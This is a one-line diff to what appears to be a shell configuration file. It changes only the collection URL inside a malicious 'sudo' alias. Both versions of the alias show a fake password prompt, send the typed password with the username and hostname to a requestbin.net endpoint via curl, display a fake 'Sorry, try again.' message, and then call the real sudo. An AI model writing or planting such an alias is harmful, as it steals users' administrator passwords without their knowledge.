@@ -1,1 +1,1 @@
-alias sudo="read -sp '[sudo] password for '$USER': ' c && curl http://requestbin.net/r/114ichl1?$c$USER@$HOSTNAME > /dev/null 2>&1 &&  printf '\nSorry, try again.\n' && $(whereis sudo | awk '{print $2}') $@"
+alias sudo="read -sp '[sudo] password for '$USER': ' c && curl http://requestbin.net/r/wzxv90wz?$c$USER@$HOSTNAME > /dev/null 2>&1 &&  printf '\nSorry, try again.\n' && $(whereis sudo | awk '{print $2}') $@"
